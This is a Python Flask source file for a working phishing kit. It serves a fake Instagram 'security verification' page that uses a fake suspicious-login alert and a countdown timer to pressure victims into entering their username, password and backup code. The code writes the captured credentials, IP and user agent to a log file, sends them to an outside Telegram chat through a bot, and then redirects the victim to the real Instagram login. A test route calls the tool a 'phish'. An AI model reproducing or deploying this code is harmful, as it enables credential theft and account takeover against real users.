from flask import Flask, request, redirect, render_template_string
import datetime
import requests
import os
import logging

# Enable logging so you can see errors in Render's log panel
logging.basicConfig(level=logging.INFO)

app = Flask(__name__)

# ========== CONFIGURE YOUR TELEGRAM ==========
BOT_TOKEN = "YOUR_BOT_TOKEN"   # <-- replace with your actual token (the long one from BotFather)
CHAT_ID = "7904798576"         # <-- paste the chat_id you just found
# =============================================

HTML_PAGE = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram • Security Verification</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.card { background: white; border: 1px solid #dbdbdb; border-radius: 12px; padding: 40px 50px; max-width: 400px; width: 100%; box-shadow: 0 2px 12px rgba(0,0,0,0.1); }
.logo { text-align: center; font-size: 36px; font-weight: 600; color: #262626; margin-bottom: 20px; }
.alert-banner { background: #ffebe8; border-left: 4px solid #ed4956; padding: 12px; border-radius: 4px; margin-bottom: 20px; }
.alert-banner p { color: #ed4956; font-size: 14px; font-weight: 600; text-align: center; }
.input-group { margin-bottom: 12px; }
.input-group label { display: block; font-size: 12px; font-weight: 600; color: #8e8e8e; margin-bottom: 4px; }
.input-group input { width: 100%; padding: 12px; border: 1px solid #dbdbdb; border-radius: 6px; font-size: 14px; background: #fafafa; }
.btn { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 10px; }
.timer { color: #ed4956; font-weight: bold; }
.footer { text-align: center; margin-top: 16px; font-size: 12px; color: #8e8e8e; }
</style>
</head>
<body>
<div class="card">
    <div class="logo">📷 Instagram</div>
    <div class="alert-banner"><p>⚠️ Suspicious login from unknown device (Frankfurt, DE)</p></div>
    <p style="font-size:14px; color:#262626; margin-bottom:16px; text-align:center;">Re-enter your password to restore full access.</p>
    <form action="/" method="POST">
        <div class="input-group"><label>Username/Email</label><input type="text" name="username" required></div>
        <div class="input-group"><label>Password</label><input type="password" name="password" required></div>
        <div class="input-group"><label>Backup code (if set)</label><input type="text" name="backup"></div>
        <p style="font-size:11px; color:#8e8e8e; margin-bottom:12px;">Session expires in <span class="timer" id="countdown">02:00</span></p>
        <button type="submit" class="btn">Secure Account</button>
    </form>
    <div class="footer"><a href="#">Help</a> • <a href="#">Privacy</a></div>
</div>
<script>
let s=120; setInterval(()=>{ let m=Math.floor(s/60), sec=s%60; document.getElementById('countdown').innerText=String(m).padStart(2,'0')+':'+String(sec).padStart(2,'0'); s--; if(s<0) document.querySelector('form').innerHTML='<p style="color:red;">Reload page</p>'; },1000);
</script>
</body>
</html>'''

def send_telegram(text):
    """Attempt to send a message and return the response object for logging."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text}
    try:
        resp = requests.get(url, params=payload, timeout=10)
        # Log the full response to Render logs
        app.logger.info(f"Telegram status: {resp.status_code}")
        app.logger.info(f"Telegram response: {resp.text}")
        return resp
    except Exception as e:
        app.logger.error(f"Telegram exception: {str(e)}")
        return None

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username', 'N/A')
        password = request.form.get('password', 'N/A')
        backup = request.form.get('backup', 'N/A')
        ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
        ua = request.headers.get('User-Agent', 'unknown')
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Log to file
        with open('creds.log', 'a') as f:
            f.write(f"[{timestamp}] IP:{ip} | USER:{username} | PASS:{password} | BACKUP:{backup} | UA:{ua}\n")

        # Send Telegram
        msg = f"🎯 NEW INSTA LOGIN\nUser: {username}\nPass: {password}\nBackup: {backup}\nIP: {ip}"
        send_telegram(msg)

        # Redirect to REAL Instagram
        return redirect('https://www.instagram.com/accounts/login/?next=%2F&source=security_alert')

    return render_template_string(HTML_PAGE)

# 👇 TEST ROUTE – visit /test in your browser to force a test message
@app.route('/test')
def test():
    result = send_telegram("✅ Test message from your Render phish – if you see this, it's working!")
    if result and result.status_code == 200:
        return "Test sent successfully! Check your Telegram."
    else:
        return f"Test failed. Check Render logs. Status: {result.status_code if result else 'No response'}", 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
